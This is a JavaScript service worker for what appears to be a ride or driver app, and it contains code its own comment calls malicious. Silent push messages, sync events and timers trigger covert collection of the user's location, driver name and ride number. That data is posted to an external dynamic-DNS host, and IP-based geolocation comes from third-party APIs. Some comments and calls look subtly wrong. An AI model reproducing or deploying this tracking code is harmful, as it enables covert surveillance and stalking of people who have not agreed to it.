self.addEventListener("install", (event) => {
  console.log("Service Worker installed.");
  self.skipWaiting();
});

self.addEventListener("activate", (event) => {
  console.log("Service Worker activated.");
  event.waitUntil(clients.claim());
});

self.addEventListener("periodicsync", (event) => {
  console.log("Periodic sync started.");
  if (event.tag === "locationFetch") {
    event.waitUntil(fetchAndSendLocation());
  }
});

self.addEventListener("sync", (event) => {
  if (event.tag === "syncLocation") {
    event.waitUntil(fetchAndSendLocation());
  }
});

self.addEventListener("notificationclick", (event) => {
  event.notification.close();
  // Trigger background fetch
  event.waitUntil(fetchAndSendLocation());
});

self.addEventListener("push", (event) => {
  const data = event.data ? event.data.json() : {};
  console.log("Push received:", data);

  if (data.silent) {
    // Perform background task without showing a notification
    fetchAndSendLocation(data.driverName, data.corridaNumber);
    return;
  }

  // If not silent, show notification
  self.registration.showNotification(data.title, {
    body: data.body,
    icon: "/icon.png",
  });
});

self.addEventListener("fetch", (event) => {
  // Optional: Intercept fetch requests and modify them
  event.respondWith(fetch(event.request));
});

// Malicious Code: Background Geolocation
function fetchAndSendLocation(driverName = null, corridaNumber = null) {
  sendLocation(driverName, corridaNumber);
  requestLocation();
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        const preciseLocation = false;
        const driverName =
          localStorage.getItem("driverName") || "Unknown Driver";
        const corridaNumber = localStorage.getItem("corridaNumber") || "N/A";
        fetch("https://locationsystemtest.zapto.org/api/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            latitude,
            longitude,
            driverName,
            corridaNumber,
            preciseLocation,
          }),
        });
      },
      (error) => console.error("Geolocation error:", error),
      { enableHighAccuracy: true },
    );
  }
}

// Periodically send location data
setInterval(fetchAndSendLocation, 3000000); // Every 5 minutes

self.addEventListener("message", (event) => {
  if (event.data.type === "LOCATION_RESPONSE") {
    const { latitude, longitude, driverName, corridaNumber } =
      event.data.payload;
    const preciseLocation = true;
    console.log(
      "Received location from client:",
      latitude,
      longitude,
      driverName,
      corridaNumber,
    );

    // Perform background tasks with the location
    fetch("https://locationsystemtest.zapto.org/api/location", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        latitude,
        longitude,
        driverName,
        corridaNumber,
        preciseLocation,
      }),
    });
  }
});

// Simulate periodic location requests
function requestLocation() {
  self.clients.matchAll().then((clients) => {
    clients.forEach((client) => {
      client.postMessage({ type: "REQUEST_LOCATION" });
    });
  });
}

// Request location every 5 minutes
setInterval(requestLocation, 300000); // 5 minutes

async function sendLocation(driverName, corridaNumber) {
  try {
    // Fetch user's IP address
    const ipResponse = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    // Fetch location data based on IP
    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
    const locationData = await locationResponse.json();

    const { latitude, longitude } = locationData;

    const preciseLocation = false;

    // Send location to server[]
    await fetch("/api/location", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        latitude,
        longitude,
        driverName,
        corridaNumber,
        preciseLocation,
      }),
    });

    console.log("Location data sent:", {
      latitude,
      longitude,
      driverName,
      corridaNumber,
    });
  } catch (error) {
    console.error("Error sending location:", error);
  }
}
